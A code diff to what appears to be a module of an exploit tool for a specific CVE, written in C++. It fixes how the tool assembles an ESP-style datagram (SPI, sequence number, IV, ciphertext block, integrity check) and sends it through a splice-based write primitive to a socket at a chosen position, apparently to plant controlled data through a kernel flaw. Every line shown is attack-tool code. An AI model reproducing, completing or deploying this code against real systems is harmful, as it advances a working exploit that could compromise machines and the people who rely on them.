@@ -18,6 +18,7 @@
  *  needed: the table measured that the old value was a code default with no other writer, and a
  *  protocol constant is not a setting.
  */
+#include <array>
 #include <cstddef>
 #include <cstdint>
 
@@ -28,6 +29,10 @@
 namespace ghostlock::backend::cve_2026_43284::seam {
     /** The block one write deals in, and where the header and the check sit inside it. */
     inline constexpr std::size_t kBlockBytes = 16U;
+    /** The bytes before the vector: the SPI and the sequence, each big-endian. */
+    inline constexpr std::size_t kHeaderBytes = 8U;
+    /** The widest datagram this window builds: the prefix, the widest vector, and the check. */
+    inline constexpr std::size_t kMaxDatagramBytes = kHeaderBytes + 2U * kBlockBytes + 2U * kBlockBytes;
 
     /** The system side of one write. */
     class SpliceOps {
@@ -105,16 +110,21 @@ namespace ghostlock::backend::cve_2026_43284::seam {
             }
             std::uint8_t iv[kBlockBytes] = {};
             splice_.compute_iv(old_block, aes_key_, iv);
-            std::uint8_t datagram[kBlockBytes] = {};
+            /* The datagram has the shape the old tree documents, and the length follows from it:
+             *  spi(4) | sequence(4) | vector(16) | ciphertext(16) | check(icv_len). The block read
+             *  above is the ciphertext already. Everything is assembled before any of it is checked
+             *  or sent, because the check covers the whole prefix rather than one field of it. */
+            const std::size_t prefix = kHeaderBytes + 2U * kBlockBytes;
+            std::array<std::uint8_t, kMaxDatagramBytes> datagram{};
+            store_be32(datagram.data(), spi_);
+            store_be32(datagram.data() + 4U, next_seq_);
             for (std::size_t i = 0U; i < kBlockBytes; ++i) {
-                datagram[i] = block[i];
+                datagram[kHeaderBytes + i] = iv[i];
+                datagram[kHeaderBytes + kBlockBytes + i] = block[i];
             }
-            /* The header carries the sequence, most significant byte first. */
-            store_be32(datagram, spi_);
-            store_be32(datagram + 4U, next_seq_);
-            std::uint8_t icv[kBlockBytes] = {};
-            splice_.compute_icv(datagram, kBlockBytes, hmac_key_, icv_len_, icv);
-            if (!splice_.splice_one(doors_.socket_fd(), datagram, kBlockBytes, position)) {
+            splice_.compute_icv(datagram.data(), prefix, hmac_key_, icv_len_,
+                                datagram.data() + prefix);
+            if (!splice_.splice_one(doors_.socket_fd(), datagram.data(), prefix + icv_len_, position)) {
                 outcome_ = WriteOutcome::NotSent;
                 return false;
             }
